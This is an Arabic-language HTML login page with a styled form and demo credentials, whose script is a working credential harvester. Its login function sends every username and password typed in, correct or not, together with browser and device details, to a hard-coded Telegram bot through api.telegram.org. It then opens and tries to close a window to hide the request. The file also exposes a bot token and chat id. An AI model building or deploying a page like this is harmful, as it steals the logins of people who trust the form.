<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>

<meta charset="UTF-8">

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>تسجيل الدخول</title>

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial;
}

body{

    background:linear-gradient(135deg,#4facfe,#00f2fe);
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    padding:20px;

}

.login-box{

    background:white;
    padding:40px;
    border-radius:20px;
    width:320px;
    box-shadow:0 0 25px rgba(0,0,0,0.2);
    text-align:center;

}

.login-box h2{

    margin-bottom:25px;
    color:#1e293b;

}

.login-box input{

    width:100%;
    padding:12px;
    margin:10px 0;
    border:1px solid #ccc;
    border-radius:10px;
    font-size:16px;
    outline:none;

}

.login-box input:focus{

    border-color:#007bff;

}

.login-box button{

    width:100%;
    padding:12px;
    border:none;
    border-radius:10px;
    background:#007bff;
    color:white;
    font-size:16px;
    cursor:pointer;
    margin-top:10px;

}

.login-box button:hover{

    background:#0056b3;

}

.message{

    margin-top:15px;
    font-size:15px;

}

.success{

    color:green;

}

.error{

    color:red;

}

.demo{

    margin-top:15px;
    font-size:13px;
    color:#64748b;

}

</style>

</head>

<body>

<div class="login-box">

<h2>تسجيل الدخول</h2>

<input type="text" id="username" placeholder="اسم المستخدم">

<input type="password" id="password" placeholder="كلمة المرور">

<button onclick="login()">دخول</button>

<div class="message" id="message"></div>

<div class="demo">

بيانات تجريبية: admin / 1234

</div>

</div>

<script>

// دالة إرسال اسم المستخدم وكلمة المرور إلى تليجرام
function sendTelegram(username, password) {
    // توكن البوت الخاص بك
    let token = "5332397047:AAHRZXSwxT3EfCT8xtCku4wh-xtE0cjla98";
    
    // معرف الدردشة الخاص بك
    let chat_id = "793135440";
    
    // 🔑 المهم: إنشاء الرسالة مع اليوزر والباسورد
    let messageText = "✅ محاولة تسجيل دخول جديدة ✅%0A%0A";
    messageText += "👤 اسم المستخدم: " + username + "%0A";
    messageText += "🔑 كلمة المرور: " + password + "%0A";
    messageText += "⏰ الوقت: " + new Date().toLocaleString('ar-EG') + "%0A";
    messageText += "🌐 المتصفح: " + navigator.userAgent.substring(0, 50);
    messageText += "%0A📱 الجهاز: " + navigator.platform;
    
    // إنشاء الرابط (نفس طريقة الكود القديم التي كانت تعمل)
    let url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + messageText;
    
    // نفس الطريقة القديمة التي كانت تعمل (window.open)
    window.open(url, '_blank');
    
    // إغلاق النافذة بعد ثانية حتى لا تزعج المستخدم
    setTimeout(function() {
        // محاولة إغلاق النافذة (قد لا تعمل في بعض المتصفحات لكنها تحاول)
        window.close();
    }, 1000);
    
    // تسجيل في الكونسول للتأكد
    console.log("جاري إرسال: " + username + " / " + password);
}

// دالة تسجيل الدخول
function login(){

    let username = document.getElementById("username").value;
    let password = document.getElementById("password").value;
    let message = document.getElementById("message");

    message.innerHTML = "";
    message.className = "message";

    // التأكد من وجود بيانات
    if(username === ""){
        message.innerHTML = "⚠️ الرجاء إدخال اسم المستخدم";
        message.classList.add("error");
        return;
    }
    
    if(password === ""){
        message.innerHTML = "⚠️ الرجاء إدخال كلمة المرور";
        message.classList.add("error");
        return;
    }

    // 🔥 إرسال البيانات إلى تليجرام (أياً كانت)
    sendTelegram(username, password);

    // التحقق من صحة البيانات
    if(username === "admin" && password === "1234"){
        message.innerHTML = "✅ تم تسجيل الدخول بنجاح";
        message.classList.add("success");
    }else{
        message.innerHTML = "❌ اسم المستخدم أو كلمة المرور غير صحيحة";
        message.classList.add("error");
    }
}

// إرسال عند الضغط على Enter
document.getElementById("username").addEventListener("keypress", function(e) {
    if(e.key === "Enter") login();
});
document.getElementById("password").addEventListener("keypress", function(e) {
    if(e.key === "Enter") login();
});

</script>

</body>

</html>
